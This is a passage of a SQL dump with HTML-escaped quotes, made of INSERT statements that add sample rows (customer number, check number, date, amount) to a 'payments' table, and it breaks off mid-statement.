INSERT INTO `payments` VALUES (\u0026#39;121\u0026#39;, \u0026#39;KI831359\u0026#39;, \u0026#39;2014-11-04\u0026#39;, \u0026#39;17876.32\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;121\u0026#39;, \u0026#39;MA302151\u0026#39;, \u0026#39;2014-11-28\u0026#39;, \u0026#39;34638.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;AE215433\u0026#39;, \u0026#39;2015-03-05\u0026#39;, \u0026#39;101244.59\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;BG255406\u0026#39;, \u0026#39;2014-08-28\u0026#39;, \u0026#39;85410.87\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;CQ287967\u0026#39;, \u0026#39;2013-04-11\u0026#39;, \u0026#39;11044.30\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;ET64396\u0026#39;, \u0026#39;2015-04-16\u0026#39;, \u0026#39;83598.04\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;HI366474\u0026#39;, \u0026#39;2014-12-27\u0026#39;, \u0026#39;47142.70\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;HR86578\u0026#39;, \u0026#39;2014-11-02\u0026#39;, \u0026#39;55639.66\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;KI131716\u0026#39;, \u0026#39;2013-08-15\u0026#39;, \u0026#39;111654.40\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;LF217299\u0026#39;, \u0026#39;2014-03-26\u0026#39;, \u0026#39;43369.30\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;124\u0026#39;, \u0026#39;NT141748\u0026#39;, \u0026#39;2013-11-25\u0026#39;, \u0026#39;45084.38\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;128\u0026#39;, \u0026#39;DI925118\u0026#39;, \u0026#39;2013-01-28\u0026#39;, \u0026#39;10549.01\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;128\u0026#39;, \u0026#39;FA465482\u0026#39;, \u0026#39;2013-10-18\u0026#39;, \u0026#39;24101.81\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;128\u0026#39;, \u0026#39;FH668230\u0026#39;, \u0026#39;2014-03-24\u0026#39;, \u0026#39;33820.62\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;128\u0026#39;, \u0026#39;IP383901\u0026#39;, \u0026#39;2014-11-18\u0026#39;, \u0026#39;7466.32\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;129\u0026#39;, \u0026#39;DM826140\u0026#39;, \u0026#39;2014-12-08\u0026#39;, \u0026#39;26248.78\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;129\u0026#39;, \u0026#39;ID449593\u0026#39;, \u0026#39;2013-12-11\u0026#39;, \u0026#39;23923.93\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;129\u0026#39;, \u0026#39;PI42991\u0026#39;, \u0026#39;2013-04-09\u0026#39;, \u0026#39;16537.85\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;131\u0026#39;, \u0026#39;CL442705\u0026#39;, \u0026#39;2013-03-12\u0026#39;, \u0026#39;22292.62\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;131\u0026#39;, \u0026#39;MA724562\u0026#39;, \u0026#39;2014-12-02\u0026#39;, \u0026#39;50025.35\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;131\u0026#39;, \u0026#39;NB445135\u0026#39;, \u0026#39;2014-09-11\u0026#39;, \u0026#39;35321.97\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;AU364101\u0026#39;, \u0026#39;2013-07-19\u0026#39;, \u0026#39;36251.03\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;DB583216\u0026#39;, \u0026#39;2014-11-01\u0026#39;, \u0026#39;36140.38\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;DL460618\u0026#39;, \u0026#39;2015-05-19\u0026#39;, \u0026#39;46895.48\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;HJ32686\u0026#39;, \u0026#39;2014-01-30\u0026#39;, \u0026#39;59830.55\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;ID10962\u0026#39;, \u0026#39;2014-12-31\u0026#39;, \u0026#39;116208.40\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;IN446258\u0026#39;, \u0026#39;2015-03-25\u0026#39;, \u0026#39;65071.26\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;JE105477\u0026#39;, \u0026#39;2015-03-18\u0026#39;, \u0026#39;120166.58\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;JN355280\u0026#39;, \u0026#39;2013-10-26\u0026#39;, \u0026#39;49539.37\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;JN722010\u0026#39;, \u0026#39;2013-02-25\u0026#39;, \u0026#39;40206.20\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;KT52578\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;63843.55\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;MC46946\u0026#39;, \u0026#39;2014-07-09\u0026#39;, \u0026#39;35420.74\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;MF629602\u0026#39;, \u0026#39;2014-08-16\u0026#39;, \u0026#39;20009.53\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;141\u0026#39;, \u0026#39;NU627706\u0026#39;, \u0026#39;2014-05-17\u0026#39;, \u0026#39;26155.91\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;144\u0026#39;, \u0026#39;IR846303\u0026#39;, \u0026#39;2014-12-12\u0026#39;, \u0026#39;36005.71\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;144\u0026#39;, \u0026#39;LA685678\u0026#39;, \u0026#39;2013-04-09\u0026#39;, \u0026#39;7674.94\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;145\u0026#39;, \u0026#39;CN328545\u0026#39;, \u0026#39;2014-07-03\u0026#39;, \u0026#39;4710.73\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;145\u0026#39;, \u0026#39;ED39322\u0026#39;, \u0026#39;2014-04-26\u0026#39;, \u0026#39;28211.70\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;145\u0026#39;, \u0026#39;HR182688\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;20564.86\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;145\u0026#39;, \u0026#39;JJ246391\u0026#39;, \u0026#39;2013-02-20\u0026#39;, \u0026#39;53959.21\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;146\u0026#39;, \u0026#39;FP549817\u0026#39;, \u0026#39;2014-03-18\u0026#39;, \u0026#39;40978.53\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;146\u0026#39;, \u0026#39;FU793410\u0026#39;, \u0026#39;2014-01-16\u0026#39;, \u0026#39;49614.72\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;146\u0026#39;, \u0026#39;LJ160635\u0026#39;, \u0026#39;2013-12-10\u0026#39;, \u0026#39;39712.10\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;148\u0026#39;, \u0026#39;BI507030\u0026#39;, \u0026#39;2013-04-22\u0026#39;, \u0026#39;44380.15\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;148\u0026#39;, \u0026#39;DD635282\u0026#39;, \u0026#39;2014-08-11\u0026#39;, \u0026#39;2611.84\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;148\u0026#39;, \u0026#39;KM172879\u0026#39;, \u0026#39;2013-12-26\u0026#39;, \u0026#39;105743.00\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;148\u0026#39;, \u0026#39;ME497970\u0026#39;, \u0026#39;2015-03-27\u0026#39;, \u0026#39;3516.04\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;151\u0026#39;, \u0026#39;BF686658\u0026#39;, \u0026#39;2013-12-22\u0026#39;, \u0026#39;58793.53\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;151\u0026#39;, \u0026#39;GB852215\u0026#39;, \u0026#39;2014-07-26\u0026#39;, \u0026#39;20314.44\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;151\u0026#39;, \u0026#39;IP568906\u0026#39;, \u0026#39;2013-06-18\u0026#39;, \u0026#39;58841.35\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;151\u0026#39;, \u0026#39;KI884577\u0026#39;, \u0026#39;2014-12-14\u0026#39;, \u0026#39;39964.63\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;157\u0026#39;, \u0026#39;HI618861\u0026#39;, \u0026#39;2014-11-19\u0026#39;, \u0026#39;35152.12\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;157\u0026#39;, \u0026#39;NN711988\u0026#39;, \u0026#39;2014-09-07\u0026#39;, \u0026#39;63357.13\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;161\u0026#39;, \u0026#39;BR352384\u0026#39;, \u0026#39;2014-11-14\u0026#39;, \u0026#39;2434.25\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;161\u0026#39;, \u0026#39;BR478494\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;50743.65\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;161\u0026#39;, \u0026#39;KG644125\u0026#39;, \u0026#39;2015-02-02\u0026#39;, \u0026#39;12692.19\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;161\u0026#39;, \u0026#39;NI908214\u0026#39;, \u0026#39;2013-08-05\u0026#39;, \u0026#39;38675.13\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;166\u0026#39;, \u0026#39;BQ327613\u0026#39;, \u0026#39;2014-09-16\u0026#39;, \u0026#39;38785.48\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;166\u0026#39;, \u0026#39;DC979307\u0026#39;, \u0026#39;2014-07-07\u0026#39;, \u0026#39;44160.92\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;166\u0026#39;, \u0026#39;LA318629\u0026#39;, \u0026#39;2014-02-28\u0026#39;, \u0026#39;22474.17\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;167\u0026#39;, \u0026#39;ED743615\u0026#39;, \u0026#39;2014-09-19\u0026#39;, \u0026#39;12538.01\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;167\u0026#39;, \u0026#39;GN228846\u0026#39;, \u0026#39;2013-12-03\u0026#39;, \u0026#39;85024.46\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;171\u0026#39;, \u0026#39;GB878038\u0026#39;, \u0026#39;2014-03-15\u0026#39;, \u0026#39;18997.89\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;171\u0026#39;, \u0026#39;IL104425\u0026#39;, \u0026#39;2013-11-22\u0026#39;, \u0026#39;42783.81\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;172\u0026#39;, \u0026#39;AD832091\u0026#39;, \u0026#39;2014-09-09\u0026#39;, \u0026#39;1960.80\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;172\u0026#39;, \u0026#39;CE51751\u0026#39;, \u0026#39;2014-12-04\u0026#39;, \u0026#39;51209.58\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;172\u0026#39;, \u0026#39;EH208589\u0026#39;, \u0026#39;2013-04-20\u0026#39;, \u0026#39;33383.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;173\u0026#39;, \u0026#39;GP545698\u0026#39;, \u0026#39;2014-05-13\u0026#39;, \u0026#39;11843.45\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;173\u0026#39;, \u0026#39;IG462397\u0026#39;, \u0026#39;2014-03-29\u0026#39;, \u0026#39;20355.24\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;175\u0026#39;, \u0026#39;CITI3434344\u0026#39;, \u0026#39;2015-05-19\u0026#39;, \u0026#39;28500.78\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;175\u0026#39;, \u0026#39;IO448913\u0026#39;, \u0026#39;2013-11-19\u0026#39;, \u0026#39;24879.08\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;175\u0026#39;, \u0026#39;PI15215\u0026#39;, \u0026#39;2014-07-10\u0026#39;, \u0026#39;42044.77\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;177\u0026#39;, \u0026#39;AU750837\u0026#39;, \u0026#39;2014-04-17\u0026#39;, \u0026#39;15183.63\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;177\u0026#39;, \u0026#39;CI381435\u0026#39;, \u0026#39;2014-01-19\u0026#39;, \u0026#39;47177.59\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;181\u0026#39;, \u0026#39;CM564612\u0026#39;, \u0026#39;2014-04-25\u0026#39;, \u0026#39;22602.36\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;181\u0026#39;, \u0026#39;GQ132144\u0026#39;, \u0026#39;2013-01-30\u0026#39;, \u0026#39;5494.78\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;181\u0026#39;, \u0026#39;OH367219\u0026#39;, \u0026#39;2014-11-16\u0026#39;, \u0026#39;44400.50\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;186\u0026#39;, \u0026#39;AE192287\u0026#39;, \u0026#39;2015-03-10\u0026#39;, \u0026#39;23602.90\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;186\u0026#39;, \u0026#39;AK412714\u0026#39;, \u0026#39;2013-10-27\u0026#39;, \u0026#39;37602.48\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;186\u0026#39;, \u0026#39;KA602407\u0026#39;, \u0026#39;2014-10-21\u0026#39;, \u0026#39;34341.08\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;187\u0026#39;, \u0026#39;AM968797\u0026#39;, \u0026#39;2014-11-03\u0026#39;, \u0026#39;52825.29\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;187\u0026#39;, \u0026#39;BQ39062\u0026#39;, \u0026#39;2014-12-08\u0026#39;, \u0026#39;47159.11\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;187\u0026#39;, \u0026#39;KL124726\u0026#39;, \u0026#39;2013-03-27\u0026#39;, \u0026#39;48425.69\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;189\u0026#39;, \u0026#39;BO711618\u0026#39;, \u0026#39;2014-10-03\u0026#39;, \u0026#39;17359.53\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;189\u0026#39;, \u0026#39;NM916675\u0026#39;, \u0026#39;2014-03-01\u0026#39;, \u0026#39;32538.74\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;198\u0026#39;, \u0026#39;FI192930\u0026#39;, \u0026#39;2014-12-06\u0026#39;, \u0026#39;9658.74\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;198\u0026#39;, \u0026#39;HQ920205\u0026#39;, \u0026#39;2013-07-06\u0026#39;, \u0026#39;6036.96\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;198\u0026#39;, \u0026#39;IS946883\u0026#39;, \u0026#39;2014-09-21\u0026#39;, \u0026#39;5858.56\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;201\u0026#39;, \u0026#39;DP677013\u0026#39;, \u0026#39;2013-10-20\u0026#39;, \u0026#39;23908.24\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;201\u0026#39;, \u0026#39;OO846801\u0026#39;, \u0026#39;2014-06-15\u0026#39;, \u0026#39;37258.94\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;202\u0026#39;, \u0026#39;HI358554\u0026#39;, \u0026#39;2013-12-18\u0026#39;, \u0026#39;36527.61\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;202\u0026#39;, \u0026#39;IQ627690\u0026#39;, \u0026#39;2014-11-08\u0026#39;, \u0026#39;33594.58\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;204\u0026#39;, \u0026#39;GC697638\u0026#39;, \u0026#39;2014-08-13\u0026#39;, \u0026#39;51152.86\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;204\u0026#39;, \u0026#39;IS150005\u0026#39;, \u0026#39;2014-09-24\u0026#39;, \u0026#39;4424.40\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;205\u0026#39;, \u0026#39;GL756480\u0026#39;, \u0026#39;2013-12-04\u0026#39;, \u0026#39;3879.96\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;205\u0026#39;, \u0026#39;LL562733\u0026#39;, \u0026#39;2013-09-05\u0026#39;, \u0026#39;50342.74\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;205\u0026#39;, \u0026#39;NM739638\u0026#39;, \u0026#39;2015-02-06\u0026#39;, \u0026#39;39580.60\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;209\u0026#39;, \u0026#39;BOAF82044\u0026#39;, \u0026#39;2015-05-03\u0026#39;, \u0026#39;35157.75\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;209\u0026#39;, \u0026#39;ED520529\u0026#39;, \u0026#39;2014-06-21\u0026#39;, \u0026#39;4632.31\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;209\u0026#39;, \u0026#39;PH785937\u0026#39;, \u0026#39;2014-05-04\u0026#39;, \u0026#39;36069.26\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;211\u0026#39;, \u0026#39;BJ535230\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;45480.79\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;216\u0026#39;, \u0026#39;BG407567\u0026#39;, \u0026#39;2013-05-09\u0026#39;, \u0026#39;3101.40\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;216\u0026#39;, \u0026#39;ML780814\u0026#39;, \u0026#39;2014-12-06\u0026#39;, \u0026#39;24945.21\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;216\u0026#39;, \u0026#39;MM342086\u0026#39;, \u0026#39;2013-12-14\u0026#39;, \u0026#39;40473.86\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;219\u0026#39;, \u0026#39;BN17870\u0026#39;, \u0026#39;2015-03-02\u0026#39;, \u0026#39;3452.75\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;219\u0026#39;, \u0026#39;BR941480\u0026#39;, \u0026#39;2013-10-18\u0026#39;, \u0026#39;4465.85\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;227\u0026#39;, \u0026#39;MQ413968\u0026#39;, \u0026#39;2013-10-31\u0026#39;, \u0026#39;36164.46\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;227\u0026#39;, \u0026#39;NU21326\u0026#39;, \u0026#39;2014-11-02\u0026#39;, \u0026#39;53745.34\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;233\u0026#39;, \u0026#39;BOFA23232\u0026#39;, \u0026#39;2015-05-20\u0026#39;, \u0026#39;29070.38\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;233\u0026#39;, \u0026#39;II180006\u0026#39;, \u0026#39;2014-07-01\u0026#39;, \u0026#39;22997.45\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;233\u0026#39;, \u0026#39;JG981190\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;16909.84\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;239\u0026#39;, \u0026#39;NQ865547\u0026#39;, \u0026#39;2014-03-15\u0026#39;, \u0026#39;80375.24\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;240\u0026#39;, \u0026#39;IF245157\u0026#39;, \u0026#39;2014-11-16\u0026#39;, \u0026#39;46788.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;240\u0026#39;, \u0026#39;JO719695\u0026#39;, \u0026#39;2014-03-28\u0026#39;, \u0026#39;24995.61\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;242\u0026#39;, \u0026#39;AF40894\u0026#39;, \u0026#39;2013-11-22\u0026#39;, \u0026#39;33818.34\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;242\u0026#39;, \u0026#39;HR224331\u0026#39;, \u0026#39;2015-06-03\u0026#39;, \u0026#39;12432.32\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;242\u0026#39;, \u0026#39;KI744716\u0026#39;, \u0026#39;2013-07-21\u0026#39;, \u0026#39;14232.70\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;249\u0026#39;, \u0026#39;IJ399820\u0026#39;, \u0026#39;2014-09-19\u0026#39;, \u0026#39;33924.24\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;249\u0026#39;, \u0026#39;NE404084\u0026#39;, \u0026#39;2014-09-04\u0026#39;, \u0026#39;48298.99\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;250\u0026#39;, \u0026#39;EQ12267\u0026#39;, \u0026#39;2015-05-17\u0026#39;, \u0026#39;17928.09\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;250\u0026#39;, \u0026#39;HD284647\u0026#39;, \u0026#39;2014-12-30\u0026#39;, \u0026#39;26311.63\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;250\u0026#39;, \u0026#39;HN114306\u0026#39;, \u0026#39;2013-07-18\u0026#39;, \u0026#39;23419.47\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;256\u0026#39;, \u0026#39;EP227123\u0026#39;, \u0026#39;2014-02-10\u0026#39;, \u0026#39;5759.42\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;256\u0026#39;, \u0026#39;HE84936\u0026#39;, \u0026#39;2014-10-22\u0026#39;, \u0026#39;53116.99\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;259\u0026#39;, \u0026#39;EU280955\u0026#39;, \u0026#39;2014-11-06\u0026#39;, \u0026#39;61234.67\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;259\u0026#39;, \u0026#39;GB361972\u0026#39;, \u0026#39;2013-12-07\u0026#39;, \u0026#39;27988.47\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;260\u0026#39;, \u0026#39;IO164641\u0026#39;, \u0026#39;2014-08-30\u0026#39;, \u0026#39;37527.58\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;260\u0026#39;, \u0026#39;NH776924\u0026#39;, \u0026#39;2014-04-24\u0026#39;, \u0026#39;29284.42\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;276\u0026#39;, \u0026#39;EM979878\u0026#39;, \u0026#39;2015-02-09\u0026#39;, \u0026#39;27083.78\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;276\u0026#39;, \u0026#39;KM841847\u0026#39;, \u0026#39;2013-11-13\u0026#39;, \u0026#39;38547.19\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;276\u0026#39;, \u0026#39;LE432182\u0026#39;, \u0026#39;2013-09-28\u0026#39;, \u0026#39;41554.73\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;276\u0026#39;, \u0026#39;OJ819725\u0026#39;, \u0026#39;2015-04-30\u0026#39;, \u0026#39;29848.52\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;278\u0026#39;, \u0026#39;BJ483870\u0026#39;, \u0026#39;2014-12-05\u0026#39;, \u0026#39;37654.09\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;278\u0026#39;, \u0026#39;GP636783\u0026#39;, \u0026#39;2013-03-02\u0026#39;, \u0026#39;52151.81\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;278\u0026#39;, \u0026#39;NI983021\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;37723.79\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;282\u0026#39;, \u0026#39;IA793562\u0026#39;, \u0026#39;2013-08-03\u0026#39;, \u0026#39;24013.52\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;282\u0026#39;, \u0026#39;JT819493\u0026#39;, \u0026#39;2014-08-02\u0026#39;, \u0026#39;35806.73\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;282\u0026#39;, \u0026#39;OD327378\u0026#39;, \u0026#39;2015-01-03\u0026#39;, \u0026#39;31835.36\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;286\u0026#39;, \u0026#39;DR578578\u0026#39;, \u0026#39;2014-10-28\u0026#39;, \u0026#39;47411.33\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;286\u0026#39;, \u0026#39;KH910279\u0026#39;, \u0026#39;2014-09-05\u0026#39;, \u0026#39;43134.04\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;298\u0026#39;, \u0026#39;AJ574927\u0026#39;, \u0026#39;2014-03-13\u0026#39;, \u0026#39;47375.92\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;298\u0026#39;, \u0026#39;LF501133\u0026#39;, \u0026#39;2014-09-18\u0026#39;, \u0026#39;61402.00\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;299\u0026#39;, \u0026#39;AD304085\u0026#39;, \u0026#39;2013-10-24\u0026#39;, \u0026#39;36798.88\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;299\u0026#39;, \u0026#39;NR157385\u0026#39;, \u0026#39;2014-09-05\u0026#39;, \u0026#39;32260.16\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;311\u0026#39;, \u0026#39;DG336041\u0026#39;, \u0026#39;2015-02-15\u0026#39;, \u0026#39;46770.52\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;311\u0026#39;, \u0026#39;FA728475\u0026#39;, \u0026#39;2013-10-06\u0026#39;, \u0026#39;32723.04\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;311\u0026#39;, \u0026#39;NQ966143\u0026#39;, \u0026#39;2014-04-25\u0026#39;, \u0026#39;16212.59\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;314\u0026#39;, \u0026#39;LQ244073\u0026#39;, \u0026#39;2014-08-09\u0026#39;, \u0026#39;45352.47\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;314\u0026#39;, \u0026#39;MD809704\u0026#39;, \u0026#39;2014-03-03\u0026#39;, \u0026#39;16901.38\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;319\u0026#39;, \u0026#39;HL685576\u0026#39;, \u0026#39;2014-11-06\u0026#39;, \u0026#39;42339.76\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;319\u0026#39;, \u0026#39;OM548174\u0026#39;, \u0026#39;2013-12-07\u0026#39;, \u0026#39;36092.40\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;320\u0026#39;, \u0026#39;GJ597719\u0026#39;, \u0026#39;2015-01-18\u0026#39;, \u0026#39;8307.28\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;320\u0026#39;, \u0026#39;HO576374\u0026#39;, \u0026#39;2013-08-20\u0026#39;, \u0026#39;41016.75\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;320\u0026#39;, \u0026#39;MU817160\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;52548.49\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;321\u0026#39;, \u0026#39;DJ15149\u0026#39;, \u0026#39;2013-11-03\u0026#39;, \u0026#39;85559.12\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;321\u0026#39;, \u0026#39;LA556321\u0026#39;, \u0026#39;2015-03-15\u0026#39;, \u0026#39;46781.66\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;323\u0026#39;, \u0026#39;AL493079\u0026#39;, \u0026#39;2015-05-23\u0026#39;, \u0026#39;75020.13\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;323\u0026#39;, \u0026#39;ES347491\u0026#39;, \u0026#39;2014-06-24\u0026#39;, \u0026#39;37281.36\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;323\u0026#39;, \u0026#39;HG738664\u0026#39;, \u0026#39;2013-07-05\u0026#39;, \u0026#39;2880.00\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;323\u0026#39;, \u0026#39;PQ803830\u0026#39;, \u0026#39;2014-12-24\u0026#39;, \u0026#39;39440.59\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;324\u0026#39;, \u0026#39;DQ409197\u0026#39;, \u0026#39;2014-12-13\u0026#39;, \u0026#39;13671.82\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;324\u0026#39;, \u0026#39;FP443161\u0026#39;, \u0026#39;2013-07-07\u0026#39;, \u0026#39;29429.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;324\u0026#39;, \u0026#39;HB150714\u0026#39;, \u0026#39;2013-11-23\u0026#39;, \u0026#39;37455.77\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;328\u0026#39;, \u0026#39;EN930356\u0026#39;, \u0026#39;2014-04-16\u0026#39;, \u0026#39;7178.66\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;328\u0026#39;, 